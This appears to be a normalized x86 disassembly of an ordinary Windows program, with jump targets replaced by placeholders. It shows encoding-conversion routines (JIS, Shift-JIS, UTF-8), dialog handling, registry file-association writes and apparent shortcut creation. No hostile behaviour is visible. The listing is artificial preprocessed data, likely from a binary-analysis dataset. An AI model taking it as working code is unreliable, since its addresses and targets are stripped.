test eax eax
je r-xdata
cmp [ esp + 0x10 ] ebp
jne r-xdata
movsx edx [ esi ]
push edx
call sub_429b24
add esp 0x4
mov [ esi ] al
movsx ecx al
push ecx
call sub_429c90
add esp 0x4
test eax eax
je r-xdata
mov al [ rw-data ]
xor ebp ebp
test al al
je r-xdata
mov ecx [ esp + 0x10 ]
add eax ecx
push eax
jmp r-xdata
mov [ edi + 0xb ] 0x1
mov al [ esi ]
cmp al 0x2b
je r-xdata
mov [ esp + 0x10 ] ebp
jmp r-xdata
xor ebx ebx
mov ebp rw-data
mov esi edi
lea eax [ ebp * 8 + rw-data ]
jmp r-xdata
mov ecx edi
call sub_417820
mov al [ esi + 0x1 ]
inc esi
test al al
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
movzx eax [ ebx * 8 + rw-data ]
push eax
mov ecx edi
call sub_417820
mov ax [ ebx * 8 + rw-data ]
test ax ax
je r-xdata
add ebp 0x8
inc ebx
cmp ebp rw-data
jl r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov ecx edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x4
jmp sub_417a20
movzx ecx ax
mov esi edi
mov eax ebp
mov dl [ edi ]
mov [ rw-data ] dl
mov edx edi
mov [ edi ] 0x2b
call sub_417560
mov edx rw-data
mov esi eax
call sub_417560
mov ebx [ esp + 0x10 ]
add eax ebx
push eax
mov ecx edi
call sub_417820
add esi ebx
push esi
mov ecx edi
call sub_417820
mov ecx edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x4
jmp sub_417a20
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
movzx eax [ ebp * 8 + rw-data ]
mov esi [ esp + 0x10 ]
add eax esi
push eax
mov ecx edi
call sub_417820
mov al [ ebp * 8 + rw-data ]
test al al
je r-xdata
mov al [ ebp * 8 + rw-data ]
inc ebp
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
movzx ecx al
add ecx esi
jmp r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
push ecx
sub_417a20
push ebx
push esi
mov esi ecx
mov al [ esi + 0xa ]
xor ebx ebx
cmp al bl
je r-xdata
push esi
mov ecx rw-data
mov [ esi + 0x8 ] bx
mov [ esi + 0xa ] bl
mov [ esi + 0xb ] bl
mov [ esi + 0x6 ] bx
mov [ esi ] bl
call sub_424540
pop esi
pop ebx
retn
mov [ esi + 0xa ] bl
call sub_417850
sub_417a60
push ebx
push ebp
push esi
mov esi ecx
mov eax [ esi + 0xc ]
push edi
mov edi [ esp + 0x14 ]
cmp eax edi
je r-xdata
mov ebx [ esp + 0x18 ]
push ebx
mov [ esi + 0xc ] edi
call sub_429b24
mov edi 0x1
add esp 0x4
cmp [ esi + 0x6 ] di
mov ebp eax
jne r-xdata
call sub_417a20
mov dx [ esi + 0x8 ]
cmp dx 0x11
jne r-xdata
mov al [ esi + 0xa ]
test al al
jne r-xdata
mov ecx [ rw-data ]
mov al [ ecx ]
test al al
mov edi ecx
je r-xdata
cmp ebp 0x22
jne r-xdata
cmp [ esi + 0x6 ] di
jne r-xdata
movsx eax [ esi ]
cmp eax ebx
jne r-xdata
cmp dx 0x29
jne r-xdata
movsx eax al
cmp ebp eax
je r-xdata
mov ebp 0x27
mov ebx ebp
cmp [ esi ] 0x6d
jne r-xdata
cmp [ esi ] 0x74
jne r-xdata
push ebx
call sub_429c39
add esp 0x4
test eax eax
jne r-xdata
cmp dx 0x24
jne r-xdata
cmp ebp 0x2e
je r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
cmp ebp 0x62
je r-xdata
cmp ebx 0x63
jne r-xdata
xor ecx ecx
cmp ebp ebx
setne cl
mov [ esi + 0xa ] 0x1
dec ecx
and ecx 0x202000
add ecx 0x55542b
mov [ esi ] ecx
mov ecx esi
call sub_417a20
cmp dx 0xf
jne r-xdata
cmp ebp 0x3d
je r-xdata
mov edi ecx
cmp ebp 0x2d
je r-xdata
mov ecx esi
mov [ esi + 0xa ] 0x1
mov [ esi ] 0x6e
call sub_417a20
cmp ebp 0x70
jne r-xdata
cmp [ edi ] 0x0
jne r-xdata
cmp ebp 0x2d
jne r-xdata
mov edi ecx
movsx ecx [ esi ]
push ecx
call sub_429b24
add esp 0x4
mov [ esi ] al
cmp ebp 0x2b
jne r-xdata
movsx eax [ esi + 0x8 ]
mov cl [ eax * 8 + rw-data ]
xor edx edx
test cl cl
jbe r-xdata
mov ecx esi
call sub_417a20
cmp ebx 0x78
jne r-xdata
mov al [ esi + 0xa ]
test al al
je r-xdata
movsx ecx [ esi + 0x8 ]
add ecx edx
mov al [ ecx * 8 + rw-data ]
test al al
lea ecx [ ecx * 8 + rw-data ]
je r-xdata
mov ecx ebx
call sub_417520
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
push 0x2
push 0x215f
call sub_4176f0
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
mov ecx esi
call sub_417a20
jmp r-xdata
movsx ecx [ esi ]
push ecx
call sub_429c67
add esp 0x4
test eax eax
je r-xdata
movsx ecx [ esi + 0x8 ]
movzx eax [ ecx * 8 + rw-data ]
inc edx
cmp edx eax
jl r-xdata
lea esp [ esp ]
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
mov ecx [ esi + 0xc ]
push 0x2
push eax
call sub_4176f0
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
cmp ebp ebx
jne r-xdata
cmp [ ecx ] 0x0
jne r-xdata
mov al [ ecx + 0x1 ]
inc ecx
test al al
jne r-xdata
mov al [ esi ]
cmp al 0x4e
je r-xdata
movsx eax [ esi + 0x6 ]
mov [ eax + esi ] bl
inc [ esi + 0x6 ]
movsx ecx [ esi + 0x6 ]
mov [ ecx + esi ] 0x0
movsx eax [ esi + 0x8 ]
add eax edx
movzx ax [ eax * 8 + rw-data ]
cmp ax 0x2b
mov [ esi + 0x8 ] ax
mov ecx 0x64
jne r-xdata
movsx eax al
cmp ebp eax
je r-xdata
jmp r-xdata
movsx edx al
push edx
mov [ esi + 0xb ] 0x1
call sub_429b24
add esp 0x4
mov [ esi ] al
cmp [ esi + 0x8 ] 0x11
jne r-xdata
cmp ebx ebp
jne r-xdata
cmp [ esi + 0x6 ] 0x1
jle r-xdata
mov [ esi + 0xa ] 0x1
mov [ esi + 0xa ] 0x1
mov [ esi + 0x8 ] cx
jmp r-xdata
cmp [ esi + 0x8 ] cx
je r-xdata
mov [ esi + 0xa ] 0x0
mov ecx esi
call sub_417850
push esi
mov ecx rw-data
call sub_424540
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
sub_417d00
push esi
mov esi ecx
mov al [ esi + 0xa ]
test al al
je r-xdata
pop esi
retn
mov eax [ esi + 0xc ]
push 0x6e
push eax
call sub_417a60
mov ecx esi
pop esi
jmp sub_417ce0
sub_417d20
mov eax [ esp + 0x4 ]
cmp eax 0x9
push esi
mov esi ecx
jne r-xdata
cmp eax 0xff
jle r-xdata
push 0x2
push eax
call sub_4176f0
pop esi
retn 0x4
cmp eax 0x20
jl r-xdata
push 0x2223
push eax
call sub_418960
add esp 0x8
push 0x2
push eax
mov ecx esi
call sub_4176f0
pop esi
retn 0x4
pop esi
retn 0x4
mov cl [ rw-data ]
test cl cl
jne r-xdata
cmp cl 0x2
jne r-xdata
push eax
push esi
mov ecx rw-data
call sub_417a60
pop esi
retn 0x4
push 0x2
push eax
mov ecx esi
call sub_4176f0
mov ecx eax
call sub_417520
test eax eax
je r-xdata
sub_417da0
sub esp 0x600
push esi
lea eax [ esp + 0x4 ]
push eax
push ecx
call sub_420c00
mov esi [ lstrcatA@IAT ]
add esp 0x8
test edi edi
je r-xdata
push r--data
lea edx [ esp + 0x8 ]
push edx
call esi
push r--data
lea eax [ esp + 0x8 ]
push eax
call esi
push 0x200
lea ecx [ esp + 0x208 ]
push ecx
push 0xffffffff
lea edx [ esp + 0x10 ]
push edx
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
mov eax [ ebx ]
push 0x1
lea ecx [ esp + 0x208 ]
push ecx
push ebx
call [ eax + 0x18 ]
pop esi
add esp 0x600
retn
cmp [ edi ] 0x0
je r-xdata
push r--data
lea edx [ esp + 0x8 ]
push edx
call esi
push edi
lea eax [ esp + 0x8 ]
push eax
call esi
push 0x0
lea ecx [ esp + 0x8 ]
push ecx
call [ CreateDirectoryA@IAT ]
sub_417e40
mov eax [ esp + 0x8 ]
sub eax 0x53
push ebx
push esi
push edi
je r-xdata
mov eax [ esp + 0x10 ]
push 0x204
push eax
call sub_414bc0
add esp 0x8
pop edi
pop esi
mov eax 0x1
pop ebx
retn 0x10
sub eax 0xbd
je r-xdata
mov ebx [ esp + 0x10 ]
push ebp
mov ebp [ CheckDlgButton@IAT ]
xor esi esi
dec eax
jne r-xdata
push 0x1
lea edi [ esi + 0x3fc ]
push edi
push ebx
call ebp
mov edx [ rw-data ]
movzx eax [ edx + esi ]
push eax
push edi
push ebx
call [ GetDlgItem@IAT ]
push eax
call [ EnableWindow@IAT ]
inc esi
cmp esi 0xa
jl r-xdata
mov ecx [ rw-data ]
mov edx [ ecx + 0xc ]
push edx
push 0x406
push ebx
call ebp
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
push ecx
push 0x407
push ebx
call ebp
mov edx [ rw-data ]
add edx 0x14
push edx
push 0x408
push ebx
call [ SetDlgItemTextA@IAT ]
pop ebp
pop edi
pop esi
mov eax 0x1
pop ebx
retn 0x10
pop edi
pop esi
xor eax eax
pop ebx
retn 0x10
movzx eax [ esp + 0x18 ]
dec eax
je r-xdata
mov edi [ esp + 0x10 ]
mov ebx [ IsDlgButtonChecked@IAT ]
xor esi esi
jmp r-xdata
dec eax
je r-xdata
lea ecx [ esi + 0x3fc ]
push ecx
push edi
call ebx
mov edx [ rw-data ]
mov [ edx + esi ] al
inc esi
cmp esi 0xa
jl r-xdata
mov eax [ esp + 0x10 ]
push 0x1
push eax
call [ EndDialog@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
retn 0x10
sub eax 0x404
je r-xdata
push 0x406
push edi
call ebx
mov ecx [ rw-data ]
push 0x407
push edi
mov [ ecx + 0xc ] eax
call ebx
mov ecx [ rw-data ]
push 0x200
mov [ ecx + 0x10 ] eax
add ecx 0x14
push ecx
push 0x408
push edi
call [ GetDlgItemTextA@IAT ]
push 0x0
push edi
call [ EndDialog@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
retn 0x10
mov esi [ esp + 0x10 ]
push 0x406
push esi
call [ IsDlgButtonChecked@IAT ]
push eax
push 0x408
push esi
call [ GetDlgItem@IAT ]
push eax
call [ EnableWindow@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
retn 0x10
sub_417fd0
mov eax [ esp + 0x8 ]
sub eax 0x53
push esi
je r-xdata
mov edx [ esp + 0x8 ]
push 0x203
push edx
call sub_414bc0
add esp 0x8
mov eax 0x1
pop esi
retn 0x10
sub eax 0xbd
je r-xdata
mov cl [ rw-data ]
xor eax eax
test cl cl
mov ecx [ esp + 0x8 ]
sete al
push eax
push 0x6e1
push ecx
call [ CheckDlgButton@IAT ]
mov eax 0x1
pop esi
retn 0x10
dec eax
jne r-xdata
xor eax eax
pop esi
retn 0x10
mov esi [ esp + 0x8 ]
push 0x6e1
push esi
call [ IsDlgButtonChecked@IAT ]
neg eax
sbb al al
inc al
mov [ rw-data ] al
movzx eax [ esp + 0x10 ]
dec eax
je r-xdata
push 0x2
push esi
call [ EndDialog@IAT ]
mov eax 0x1
pop esi
retn 0x10
dec eax
je r-xdata
push 0x0
push esi
call [ EndDialog@IAT ]
mov eax 0x1
pop esi
retn 0x10
sub eax 0x6de
je r-xdata
push 0x1
push esi
call [ EndDialog@IAT ]
mov eax 0x1
pop esi
retn 0x10
sub_4180a0
sub esp 0xc
lea eax [ esp ]
push eax
push 0x1
push 0x0
push ecx
push 0x80000000
mov [ esp + 0x18 ] 0x200
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
lea edx [ esp + 0x4 ]
push edx
mov edx [ esp + 0x4 ]
push eax
lea ecx [ esp + 0x10 ]
push ecx
push 0x0
push 0x0
push edx
call [ RegQueryValueExA@IAT ]
mov eax [ esp ]
push eax
call [ RegCloseKey@IAT ]
xor eax eax
add esp 0xc
retn
mov eax 0x1
add esp 0xc
retn
sub_418100
mov ecx [ esp + 0x8 ]
sub esp 0x208
lea eax [ esp + 0x214 ]
push eax
push ecx
lea edx [ esp + 0x10 ]
push edx
call [ wvsprintfA@IAT ]
mov edx [ esp + 0x20c ]
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esp + 0x4 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
push edx
push 0x80000000
call [ RegCreateKeyExA@IAT ]
lea eax [ esp + 0x8 ]
push eax
call [ lstrlenA@IAT ]
mov edx [ esp ]
inc eax
push eax
lea ecx [ esp + 0xc ]
push ecx
push 0x1
push 0x0
push 0x0
push edx
call [ RegSetValueExA@IAT ]
mov eax [ esp ]
push eax
call [ RegCloseKey@IAT ]
add esp 0x208
retn
sub_418180
mov eax [ esp + 0x4 ]
sub esp 0x81c
push ebx
xor ebx ebx
cmp eax ebx
jne r-xdata
xor ecx ecx
push esi
cmp eax ebx
push edi
sete cl
push 0x200
lea eax [ esp + 0x2c ]
push eax
push 0x1a
lea edx [ esp + 0x20 ]
mov [ rw-data ] edx
mov edi ecx
mov ecx [ rw-data ]
push ecx
mov [ esp + 0x30 ] 0x1
mov [ esp + 0x34 ] ebx
call [ LoadStringA@IAT ]
mov eax [ rw-data ]
push 0x200
lea edx [ esp + 0x62c ]
push edx
push eax
call [ GetModuleFileNameA@IAT ]
test eax eax
je r-xdata
cmp [ rw-data ] bl
je r-xdata
pop edi
pop esi
lea ecx [ esp + 0x628 ]
push ecx
lea edx [ esp + 0x42c ]
push r--data
push edx
call sub_42a060
add esp 0xc
xor esi esi
jmp r-xdata
pop ebx
add esp 0x81c
retn
mov ecx [ esi * 4 + rw-data ]
lea eax [ esp + 0x228 ]
push eax
call sub_4180a0
add esp 0x4
test eax eax
jne r-xdata
mov [ esp + esi + 0x14 ] 0x1
xor edi edi
lea ecx [ esp + 0x228 ]
push ecx
push r--data
call sub_431aa6
add esp 0x8
test eax eax
jne r-xdata
lea edx [ esp + 0x228 ]
push edx
mov ecx r--data
call sub_4180a0
add esp 0x4
test eax eax
je r-xdata
mov [ esp + esi + 0x14 ] bl
jmp r-xdata
lea eax [ esp + 0x228 ]
push eax
push r--data
call sub_431aa6
add esp 0x8
test eax eax
mov [ esp + 0x1c ] bl
je r-xdata
mov [ esp + 0x1c ] 0x1
jmp r-xdata
inc esi
cmp esi 0x8
jl r-xdata
lea ecx [ esp + 0x228 ]
push ecx
mov ecx r--data
call sub_4180a0
add esp 0x4
test eax eax
je r-xdata
xor edi edi
lea edx [ esp + 0x228 ]
push edx
push r--data
call sub_431aa6
add esp 0x8
test eax eax
mov [ esp + 0x1d ] bl
je r-xdata
mov [ esp + 0x1d ] 0x1
jmp r-xdata
lea eax [ esp + 0x228 ]
push eax
mov ecx r--data
call sub_4180a0
mov esi [ lstrlenA@IAT ]
add esp 0x4
test eax eax
jne r-xdata
xor edi edi
xor edi edi
lea ecx [ esp + 0x428 ]
push ecx
call esi
push eax
lea edx [ esp + 0x22c ]
push edx
lea eax [ esp + 0x430 ]
push eax
call sub_431a51
add esp 0xc
test eax eax
je r-xdata
xor edi edi
mov [ esp + 0x1c ] 0x1
lea edx [ esp + 0x428 ]
push edx
call esi
push eax
lea eax [ esp + 0x22c ]
push eax
lea ecx [ esp + 0x430 ]
push ecx
call sub_431a51
add esp 0xc
test eax eax
je r-xdata
lea ecx [ esp + 0x228 ]
push ecx
mov ecx r--data
call sub_4180a0
add esp 0x4
test eax eax
jne r-xdata
lea eax [ esp + 0x428 ]
push eax
call esi
push eax
lea ecx [ esp + 0x22c ]
push ecx
lea edx [ esp + 0x430 ]
push edx
call sub_431a51
add esp 0xc
test eax eax
je r-xdata
mov [ esp + 0x1d ] 0x1
jmp r-xdata
lea edx [ esp + 0x228 ]
push edx
mov ecx r--data
call sub_4180a0
add esp 0x4
test eax eax
je r-xdata
cmp edi ebx
jne r-xdata
mov [ esp + 0x1d ] 0x1
jmp r-xdata
mov eax [ rw-data ]
push ebx
push sub_417fd0
push eax
push 0x390
call sub_420d20
add esp 0x10
sub eax ebx
je r-xdata
dec eax
jne r-xdata
xor esi esi
mov ecx [ rw-data ]
push ebx
push sub_417e40
push ecx
push 0x384
call sub_420d20
add esp 0x10
test eax eax
jne r-xdata
inc esi
cmp esi 0x8
jl r-xdata
mov edx [ esi * 4 + rw-data ]
push r--data
push edx
call sub_418100
add esp 0x8
cmp [ esp + esi + 0x14 ] bl
je r-xdata
push 0x1b
call sub_420ca0
push eax
push r--data
call sub_418100
push 0x371
lea eax [ esp + 0x638 ]
push eax
push r--data
push r--data
call sub_418100
lea ecx [ esp + 0x444 ]
push ecx
push r--data
push r--data
call sub_418100
mov al [ esp + 0x44 ]
add esp 0x28
cmp al bl
je r-xdata
cmp [ esp + 0x1d ] bl
je r-xdata
push r--data
push r--data
call sub_418100
push 0x1c
call sub_420ca0
push eax
push r--data
call sub_418100
push 0x373
lea edx [ esp + 0x640 ]
push edx
push r--data
push r--data
call sub_418100
lea eax [ esp + 0x44c ]
push eax
push r--data
push r--data
call sub_418100
add esp 0x30
cmp [ esp + 0x20 ] ebx
jne r-xdata
push r--data
push r--data
call sub_418100
lea ecx [ esp + 0x430 ]
push ecx
push r--data
push r--data
call sub_418100
add esp 0x14
lea edx [ esp + 0xc ]
push edx
push r--data
push 0x1
push ebx
push r--data
call [ CoCreateInstance@IAT ]
test eax eax
jne r-xdata
cmp [ esp + 0x24 ] ebx
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ esp + 0xc ]
mov ecx [ eax ]
lea edx [ esp + 0x628 ]
push edx
push eax
call [ ecx + 0x50 ]
mov eax [ esp + 0xc ]
mov ecx [ eax ]
push r--data
push eax
call [ ecx + 0x1c ]
mov eax [ esp + 0xc ]
mov edx [ eax ]
lea ecx [ esp + 0x10 ]
push ecx
push r--data
push eax
call [ edx ]
test eax eax
jne r-xdata
cmp [ esp + 0x20 ] ebx
je r-xdata
cmp [ esp + 0x24 ] ebx
je r-xdata
mov ebx [ esp + 0x10 ]
lea edi [ esp + 0x28 ]
mov ecx 0x2
call sub_417da0
xor ebx ebx
mov eax [ esp + 0x10 ]
mov edx [ eax ]
push eax
call [ edx + 0x8 ]
mov ebx [ esp + 0x10 ]
xor edi edi
xor ecx ecx
call sub_417da0
sub_4185c0
xor edx edx
push ebp
mov ebp [ esp + 0x8 ]
mov eax [ ebp ]
push esi
push edi
mov edi [ ecx ]
cmp edi 0x9f
setl dl
mov esi edx
xor edx edx
cmp eax 0xa0
setge dl
dec edx
and edx 0xffffffc0
add edx 0xb0
test esi esi
je r-xdata
sub eax edx
shl eax 0x1
sub eax esi
mov [ ebp ] eax
mov eax [ ecx ]
mov edi 0x7e
sub eax edi
pop edi
pop esi
mov [ ecx ] eax
pop ebp
retn
push ebx
xor ebx ebx
cmp edi 0x7f
setg bl
sub eax edx
shl eax 0x1
sub eax esi
mov [ ebp ] eax
mov eax [ ecx ]
add ebx 0x1f
mov edi ebx
pop ebx
sub eax edi
pop edi
pop esi
mov [ ecx ] eax
pop ebp
retn
sub_418630
movsx eax [ rw-data ]
test eax eax
jne r-xdata
add eax 0xfffffb1e
cmp eax 0x8
ja r-xdata
call [ GetACP@IAT ]
mov [ rw-data ] rw-data
retn
jmp [ eax * 4 + jump_table_4186b8 ]
mov [ rw-data ] rw-data
retn
mov [ rw-data ] rw-data
retn
mov [ rw-data ] rw-data
retn
mov [ rw-data ] rw-data
retn
mov [ rw-data ] rw-data
retn
mov [ rw-data ] rw-data
retn
mov [ rw-data ] rw-data
retn
mov [ rw-data ] rw-data
retn
sub_4186e0
mov eax [ esp + 0x4 ]
mov ecx eax
sar ecx 0x8
and eax 0xff
test cl 0x1
push esi
mov esi eax
je r-xdata
mov edx 0x7e
mov eax 0x5f
cmp eax esi
sbb edx edx
neg edx
add edx 0x1f
jmp r-xdata
cmp ecx 0x5f
sbb eax eax
and eax 0xffffffc0
add eax 0xb0
shl eax 0x8
inc ecx
shl ecx 0x7
and ecx 0xffffff00
add edx esi
add eax ecx
or eax edx
pop esi
retn
sub_418730
mov eax [ esp + 0x4 ]
cmp eax 0x7e
jle r-xdata
retn
cmp eax 0x80
jl r-xdata
cmp eax 0x2330
jl r-xdata
cmp eax 0xff
jg r-xdata
cmp eax 0x2421
jl r-xdata
cmp eax 0x237a
jg r-xdata
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 - 0x100 ]
retn
cmp eax 0x2521
jl r-xdata
cmp eax 0x2473
jg r-xdata
add eax 0xdbe0
retn
cmp eax 0x2621
jl r-xdata
cmp eax 0x2576
jg r-xdata
add eax 0xc20
retn
cmp eax 0x2721
jl r-xdata
cmp eax 0x2658
jg r-xdata
add eax 0xb80
retn
cmp eax 0x3021
jl r-xdata
cmp eax 0x2771
jg r-xdata
cmp eax 0x2631
jle r-xdata
cmp eax 0x2121
jl r-xdata
cmp eax 0x7426
jg r-xdata
cmp eax 0x2726
jg r-xdata
add eax 0xffffdd70
retn
cmp eax 0x2638
jle r-xdata
cmp eax 0x2221
jl r-xdata
cmp eax 0x217e
jg r-xdata
mov ecx eax
and ecx 0x7f
cmp ecx 0x21
jl r-xdata
cmp eax 0x2727
jne r-xdata
add eax 0xffffdcef
retn
add eax 0xffffdd71
retn
cmp eax 0x2641
jl r-xdata
cmp eax 0x2821
jl r-xdata
cmp eax 0x227e
jg r-xdata
movzx eax [ eax * 2 + r--data ]
retn
xor eax eax
cmp ecx 0x7e
jg r-xdata
cmp eax 0x2741
jg r-xdata
mov eax 0x401
retn
cmp eax 0x2651
jg r-xdata
cmp eax 0x2840
jg r-xdata
movzx eax [ eax * 2 + __import_name_4(GDI32:GetDeviceCaps) ]
retn
sub eax 0x3021
mov edx eax
shr edx 0x8
movzx ecx dl
imul ecx ecx 0x5e
movzx edx al
add ecx edx
movzx eax [ ecx * 2 + rw-data ]
retn
cmp eax 0x2751
jl r-xdata
add eax 0xffffdcee
retn
movzx eax [ eax * 2 + r--data ]
retn
cmp eax 0x2756
jg r-xdata
cmp eax 0x2757
jne r-xdata
add eax 0xffffdcdf
retn
add eax 0xffffdcde
retn
mov eax 0x451
retn
sub_4188c0
mov eax [ esp + 0x8 ]
push eax
call sub_418730
mov ecx [ esp + 0x8 ]
add esp 0x4
test eax 0xff80
je r-xdata
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
retn
test ah 0xf8
push esi
mov esi [ ecx ]
mov edx eax
jne r-xdata
sar edx 0xc
or dl 0xe0
mov [ esi ] dl
mov edx [ ecx ]
inc edx
mov [ ecx ] edx
mov esi edx
mov edx eax
sar edx 0x6
and dl 0x3f
or dl 0x80
sar edx 0x6
or dl 0xc0
jmp r-xdata
mov [ esi ] dl
mov edx [ ecx ]
inc edx
and al 0x3f
mov [ ecx ] edx
or al 0x80
pop esi
sub_418920
push ecx
mov eax [ esp + 0x8 ]
mov ecx eax
sar ecx 0x8
lea edx [ esp + 0x8 ]
mov [ esp + 0x8 ] ecx
and eax 0xff
push edx
lea ecx [ esp + 0x4 ]
mov [ esp + 0x4 ] eax
call sub_4185c0
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
shl eax 0x8
or eax ecx
add esp 0x8
retn
sub_418960
push esi
mov esi [ esp + 0x8 ]
cmp esi 0x7e
jg r-xdata
cmp esi 0x3041
jl r-xdata
mov eax esi
pop esi
retn
cmp esi 0x30a1
jl r-xdata
cmp esi 0x3093
jg r-xdata
push edi
mov edi [ rw-data ]
cmp edi rw-data
je r-xdata
cmp esi 0x30f6
jg r-xdata
lea eax [ esi - 0xc20 ]
pop esi
retn
cmp edi rw-data
je r-xdata
cmp esi 0x391
jl r-xdata
lea eax [ esi - 0xb80 ]
pop esi
retn
xor ecx ecx
nop
cmp esi 0x401
jne r-xdata
cmp esi 0x3c9
jg r-xdata
mov eax 0xae4c415d
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov esi edx
imul esi esi 0x5e
mov eax ecx
sub eax esi
add edx 0x30
add eax 0x21
shl edx 0x8
pop edi
or eax edx
pop esi
retn
inc ecx
cmp ecx 0x18fe
jl r-xdata
cmp esi 0x451
jne r-xdata
pop edi
mov eax 0x2727
pop esi
retn
cmp esi 0x3a1
jg r-xdata
movzx eax [ ecx * 2 + rw-data ]
cmp eax esi
je r-xdata
xor ecx ecx
jmp r-xdata
cmp esi 0x410
jl r-xdata
pop edi
mov eax 0x2757
pop esi
retn
cmp esi 0x3a2
jne r-xdata
pop edi
lea eax [ esi + 0x2290 ]
pop esi
retn
movzx edx [ ecx * 2 + rw-data ]
cmp edx esi
jne r-xdata
cmp esi 0x44f
jg r-xdata
cmp esi 0x3a9
jg r-xdata
pop edi
xor eax eax
pop esi
retn
inc ecx
cmp ecx 0xdc
jl r-xdata
mov eax 0xae4c415d
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
sub edx 0x0
je r-xdata
cmp esi 0x415
jg r-xdata
cmp esi 0x3b1
jl r-xdata
pop edi
lea eax [ esi + 0x228f ]
pop esi
retn
xor eax eax
pop edi
lea eax [ ecx + 0x2121 ]
pop esi
retn
dec edx
je r-xdata
cmp esi 0x42f
jg r-xdata
pop edi
lea eax [ esi + 0x2311 ]
pop esi
retn
cmp esi 0x3c1
jle r-xdata
pop edi
add eax 0x80
pop esi
retn
inc eax
cmp eax 0x80
jl r-xdata
pop edi
lea eax [ ecx + 0x21c3 ]
pop esi
retn
dec edx
je r-xdata
cmp esi 0x435
jg r-xdata
pop edi
lea eax [ esi + 0x2312 ]
pop esi
retn
cmp esi 0x3c2
jne r-xdata
movzx ecx [ edi + eax * 2 ]
cmp ecx esi
je r-xdata
cmp esi 0xff10
jl r-xdata
pop edi
lea eax [ ecx + 0x2765 ]
pop esi
retn
pop edi
lea eax [ esi + 0x2322 ]
pop esi
retn
pop edi
lea eax [ esi + 0x2321 ]
pop esi
retn
pop edi
xor eax eax
pop esi
retn
cmp esi 0xfeff
je r-xdata
cmp esi 0xff5a
jg r-xdata
mov eax esi
cmp esi 0xfffe
mov eax [ esp + 0x10 ]
jne r-xdata
pop edi
lea eax [ esi - 0xdbe0 ]
pop esi
retn
pop edi
pop esi
retn
sub_418b70
push esi
mov esi [ esp + 0x8 ]
mov ecx [ esi ]
mov al [ ecx ]
test al al
js r-xdata
mov dl al
and dl 0xe0
cmp dl 0xc0
jne r-xdata
movzx eax al
inc ecx
push 0x2223
push eax
mov [ esi ] ecx
call sub_418960
add esp 0x8
pop esi
retn
mov dl al
and dl 0xf0
cmp dl 0xe0
jne r-xdata
xor edx edx
mov dl [ ecx + 0x1 ]
and eax 0x1f
shl eax 0x6
add ecx 0x2
push 0x2223
mov [ esi ] ecx
and edx 0x3f
or eax edx
push eax
call sub_418960
add esp 0x8
pop esi
retn
and al 0xf8
cmp al 0xf0
jne r-xdata
xor edx edx
mov dl [ ecx + 0x1 ]
and eax 0xf
shl eax 0x6
add ecx 0x3
push 0x2223
and edx 0x3f
or eax edx
xor edx edx
mov dl [ ecx - 0x1 ]
shl eax 0x6
mov [ esi ] ecx
and edx 0x3f
or eax edx
push eax
call sub_418960
add esp 0x8
pop esi
retn
mov eax [ esp + 0x8 ]
push 0x2223
push eax
call sub_418960
add esp 0x8
pop esi
retn
mov eax 0xffff
add ecx 0x4
push 0x2223
push eax
mov [ esi ] ecx
call sub_418960
add esp 0x8
pop esi
retn
sub_418c40
mov edx [ esp + 0x4 ]
mov eax ecx
sub [ eax + 0x28 ] dx
mov cx [ eax + 0x28 ]
mov eax [ eax + 0x24 ]
push esi
shr eax cl
mov esi 0x1
mov ecx edx
shl esi cl
dec esi
and eax esi
pop esi
retn 0x4
sub_418c70
push ecx
push ebx
mov ebx [ esp + 0xc ]
xor eax eax
push ebp
mov ebp [ ebx ]
push esi
mov esi ecx
mov ecx [ esi + 0x10 ]
mov [ esp + 0xc ] eax
mov [ esp + 0x14 ] eax
mov eax [ esi + 0x14 ]
inc eax
cmp eax ecx
jl r-xdata
cmp [ esi + 0x20 ] 0x7
push edi
mov edi [ esp + 0x1c ]
mov ecx esi
jne r-xdata
mov ecx esi
call sub_4012a0
test eax eax
jne r-xdata
call sub_4013f0
cmp eax 0x8e
jne r-xdata
call sub_4013f0
cmp eax 0xde
mov [ edi ] eax
jne r-xdata
pop esi
pop ebp
pop ebx
pop ecx
retn 0x8
mov eax [ esi + 0x14 ]
dec eax
mov ecx esi
call sub_4013f0
cmp eax 0xde
mov [ edi ] eax
jne r-xdata
cmp eax 0xdf
jne r-xdata
mov eax [ ebx ]
cmp eax 0xb6
jl r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
cmp eax 0xdf
jg r-xdata
cmp eax 0xdf
jne r-xdata
mov eax [ ebx ]
cmp eax 0xb6
